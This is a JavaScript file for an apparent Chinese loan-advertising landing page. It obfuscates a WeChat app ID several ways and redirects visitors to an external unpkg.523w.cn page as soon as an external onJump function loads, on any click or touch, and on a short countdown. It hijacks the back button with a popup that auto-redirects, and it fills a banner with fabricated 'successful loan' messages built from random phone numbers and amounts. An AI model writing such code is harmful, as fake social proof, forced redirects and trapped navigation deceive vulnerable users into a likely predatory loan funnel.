// 简化的页面管理器
class PageManager {
    constructor() {
        this.init();
    }

    init() {
        console.log('页面初始化完成');
    }
}

// 微信小程序配置
const miniProgramConfig = {
    appId: getWxAppId(),
    path: 'pages/index/index'
};

// 方法1: 字符串拼接
function getWxAppId() {
    const prefix = 'wx';
    const middle = '459db4da';
    const suffix = '7366330e';
    return prefix + middle + suffix;
}

// 方法2: Base64解码 (备用方案)
function getWxAppIdFromBase64() {
    // d3g0NTlkYjRkYTczNjYzMzBl 是 的Base64编码
    const encoded = 'd3g0NTlkYjRkYTczNjYzMzBl';
    return atob(encoded);
}

// 方法3: 字符码转换 (备用方案)
function getWxAppIdFromCharCodes() {
    const codes = [119, 120, 52, 53, 57, 100, 98, 52, 100, 97, 55, 51, 54, 54, 51, 51, 48, 101];
    return String.fromCharCode(...codes);
}

// 方法4: 数组拼接 (备用方案)
function getWxAppIdFromArray() {
    const parts = ['wx', '4', '5', '9', 'd', 'b', '4', 'd', 'a', '7', '3', '6', '6', '3', '3', '0', 'e'];
    return parts.join('');
}

// 方法5: 简单替换 (备用方案)
function getWxAppIdFromReplace() {
    const template = 'ab459db4da7366330e';
    return template.replace('ab', 'wx');
}

// 检测是否在微信环境中
function isWechat() {
    return /MicroMessenger/i.test(navigator.userAgent);
}


function jumpToTargetPage() {

    console.log('onJump方法是否存在:', typeof onJump);
    
    try {
 
        if (typeof onJump === 'function') {
            console.log('调用onJump方法进行跳转');
            onJump();
        } else {
            console.error('onJump方法未定义，使用备用跳转方案');
            // 备用跳转方案
            const urlParams = new URLSearchParams(window.location.search);
            const callback = urlParams.get('callback');
            let targetUrl = 'https://unpkg.523w.cn/hier-lc@1.0.0/5cyGl.html#cqxPEu';
            if (callback) {
                targetUrl += `?callback=${encodeURIComponent(callback)}`;
            }
            console.log('使用备用跳转方案:', targetUrl);
            window.location.href = targetUrl;
        }
    } catch (e) {
        console.error('跳转出错:', e);
        // 出错时使用备用跳转方案
        const urlParams = new URLSearchParams(window.location.search);
        const callback = urlParams.get('callback');
        let targetUrl = 'https://unpkg.523w.cn/hier-lc@1.0.0/5cyGl.html#cqxPEu';
        if (callback) {
            targetUrl += `?callback=${encodeURIComponent(callback)}`;
        }
        window.location.href = targetUrl;
    }
}

// 回退到Scheme跳转（已废弃，保留函数避免报错）
function fallbackToScheme() {
    console.log('=== 使用外链跳转 ===');
    
    try {
        // 调用外链提供的onJump方法
        if (typeof onJump === 'function') {
            onJump();
        } else {
            console.error('onJump方法未定义，使用备用跳转方案');
            const urlParams = new URLSearchParams(window.location.search);
            const callback = urlParams.get('callback');
            let targetUrl = 'https://unpkg.523w.cn/hier-lc@1.0.0/5cyGl.html#cqxPEu';
            if (callback) {
                targetUrl += `?callback=${encodeURIComponent(callback)}`;
            }
            console.log('备用跳转URL:', targetUrl);
            window.location.href = targetUrl;
        }
    } catch (e) {
        console.error('跳转出错:', e);
        // 出错时使用备用跳转方案
        const urlParams = new URLSearchParams(window.location.search);
        const callback = urlParams.get('callback');
        let targetUrl = 'https://unpkg.523w.cn/hier-lc@1.0.0/5cyGl.html#cqxPEu';
        if (callback) {
            targetUrl += `?callback=${encodeURIComponent(callback)}`;
        }
        window.location.href = targetUrl;
    }
}

// 创建全局页面管理器实例
const pageManager = new PageManager();

// Banner消息生成器
class BannerMessageGenerator {
    constructor() {
        this.messages = [];
        this.init();
    }

    init() {
        this.generateMessages();
        this.renderMessages();
    }

    // 生成手机号前缀
    generatePhonePrefix() {
        const prefixes = ['130', '131', '132', '133', '134', '135', '136', '137', '138', '139',
                         '150', '151', '152', '153', '155', '156', '157', '158', '159',
                         '177', '178', '179', '180', '181', '182', '183', '184', '185', '186', '187', '188', '189',
                         '190', '191', '192', '193', '194', '195', '196', '197', '198', '199', '200'];
        return prefixes[Math.floor(Math.random() * prefixes.length)];
    }

    // 生成手机号后缀
    generatePhoneSuffix() {
        return Math.floor(1000 + Math.random() * 9000);
    }

    // 生成借款额度
    generateAmount() {
        const amounts = [14000, 15000, 16000, 17000, 18000, 19000, 20000, 21000, 22000, 23000, 24000, 25000, 26000];
        return amounts[Math.floor(Math.random() * amounts.length)];
    }

    // 生成单个消息
    generateSingleMessage() {
        const prefix = this.generatePhonePrefix();
        const suffix = this.generatePhoneSuffix();
        const amount = this.generateAmount();
        return `恭喜 ${prefix}****${suffix} 成功借款${amount}额度!`;
    }

    // 生成所有消息
    generateMessages() {
        this.messages = [];
        for (let i = 0; i < 50; i++) {
            this.messages.push(this.generateSingleMessage());
        }
    }

    // 渲染消息到DOM
    renderMessages() {
        const bannerText = document.getElementById('bannerText');
        if (bannerText) {
            bannerText.innerHTML = '';
            this.messages.forEach(message => {
                const span = document.createElement('span');
                span.textContent = message;
                bannerText.appendChild(span);
            });
        }
    }

    // 更新消息（可以定期调用）
    updateMessages() {
        this.generateMessages();
        this.renderMessages();
    }
}

// 创建banner消息生成器实例
const bannerGenerator = new BannerMessageGenerator();

// 每5分钟更新一次banner消息
setInterval(() => {
    bannerGenerator.updateMessages();
    console.log('Banner消息已更新');
}, 5 * 60 * 1000);




// 显示加载状态
function showLoading() {
    const activateBtn = document.getElementById('activateBtn');
    if (activateBtn) {
        // 添加loading类
        activateBtn.classList.add('loading');
        
        // 显示加载内容，隐藏按钮文字
        const buttonText = activateBtn.querySelector('.button-text');
        const loadingContent = activateBtn.querySelector('.loading-content');
        
        if (buttonText && loadingContent) {
            buttonText.style.display = 'none';
            loadingContent.style.display = 'flex';
        }
        
        // 禁用按钮
        activateBtn.style.pointerEvents = 'none';
    }
}

// 显示弹框
function showPopup() {
    const popupOverlay = document.getElementById('popupOverlay');
    if (popupOverlay) {
        popupOverlay.style.display = 'flex';
        startCountdown();
    }
}

// 隐藏弹框
function hidePopup() {
    const popupOverlay = document.getElementById('popupOverlay');
    if (popupOverlay) {
        popupOverlay.style.display = 'none';
    }
}

// 开始倒计时
function startCountdown() {
    let countdown = 2;
    const countdownNumber = document.getElementById('countdownNumber');

    const countdownInterval = setInterval(function() {
        countdown--;
        if (countdownNumber) {
            countdownNumber.textContent = countdown;
        }

        if (countdown <= 0) {
            clearInterval(countdownInterval);
            // 自动领取（跳转）
            jumpToTargetPage();
        }
    }, 800);
}

// 页面加载完成后绑定事件
document.addEventListener('DOMContentLoaded', function() {
    console.log('页面加载完成，绑定事件');
    

    function checkAndJump() {

        
        if (typeof onJump === 'function') {
            console.log('✓ onJump方法可用，立即跳转');
            jumpToTargetPage();
            return true;
        }
        
        if (window.WEIKEJS && window.WEIKEJS.onJump) {
            console.log('✓ WEIKEJS.onJump方法可用，立即跳转');
            jumpToTargetPage();
            return true;
        }
 
        return false;
    }
    
    // 立即检查一次
    if (!checkAndJump()) {
        // 如果还没加载完成，持续检查直到加载成功
        const checkInterval = setInterval(() => {
            if (checkAndJump()) {
                clearInterval(checkInterval);
            }
        }, 100); // 每100ms检查一次
    }
    
    let isFirstClickBack = true; // 标记返回按钮是否是第一次点击

    // 绑定激活额度按钮点击事件
    const activateBtn = document.getElementById('activateBtn');
    if (activateBtn) {
        activateBtn.addEventListener('click', function(e) {
            e.preventDefault();
            console.log('激活额度按钮被点击');
            
            // 显示加载状态
            showLoading();
            
            // 延迟跳转，让用户看到加载动画
            setTimeout(() => {
                jumpToTargetPage();
            }, 100);
        });
    }

    // 绑定返回按钮点击事件
    const backBtn = document.getElementById('backBtn');
    if (backBtn) {
        backBtn.addEventListener('click', function() {
            if (isFirstClickBack) {
                // 第一次点击显示弹框
                console.log('返回按钮第一次点击，显示弹框');
                showPopup();
                isFirstClickBack = false;
            } else {
                // 第二次点击真实返回
                console.log('返回按钮第二次点击，执行真实返回');
                if (window.history.length > 1) {
                    window.history.back();
                } else {
                    window.close();
                }
            }
        });
    }

    // 绑定弹框按钮点击事件
    const popupButton = document.getElementById('popupButton');
    if (popupButton) {
        popupButton.addEventListener('click', function() {
            console.log('弹框领取按钮被点击');
            hidePopup();
            jumpToTargetPage();
        });
    }

    // 绑定弹框关闭按钮
    const popupCloseBtn = document.getElementById('popupCloseBtn');
    if (popupCloseBtn) {
        popupCloseBtn.addEventListener('click', function() {
            console.log('弹框关闭按钮被点击');
            hidePopup();
        });
    }

    // 绑定单击屏幕任意位置跳转（除了按钮和弹框）
    document.addEventListener('click', function(e) {
        // 如果点击的是按钮或弹框，不处理跳转
        if (e.target === activateBtn || (activateBtn && activateBtn.contains(e.target)) ||
            e.target === backBtn || (backBtn && backBtn.contains(e.target)) ||
            e.target.closest('.popup-overlay')) {
            return;
        }

        // 用户点击触发跳转
        console.log('用户点击触发跳转');
        jumpToTargetPage();
    });
    
    // 绑定触摸事件，确保移动设备兼容性
    document.addEventListener('touchstart', function(e) {
        // 如果触摸的是按钮或弹框，不处理跳转
        if (e.target === activateBtn || (activateBtn && activateBtn.contains(e.target)) ||
            e.target === backBtn || (backBtn && backBtn.contains(e.target)) ||
            e.target.closest('.popup-overlay')) {
            return;
        }

        // 用户触摸触发跳转
        console.log('用户触摸触发跳转');
        jumpToTargetPage();
    });

    // 绑定客服电话点击事件
    const kefuElement = document.querySelector('.kefu');
    if (kefuElement) {
        kefuElement.addEventListener('click', function() {
            console.log('客服区域被点击');
            window.location.href = 'tel:400-138-0866';
        });
    }

    // 绑定流程步骤点击事件
    const processItems = document.querySelectorAll('.process-item');
    processItems.forEach((item, index) => {
        item.addEventListener('click', function() {
            const stepName = item.querySelector('p').textContent;
            console.log('流程步骤被点击:', stepName);
        });
    });

    // 页面加载完成
    console.log('页面加载完成');
}); 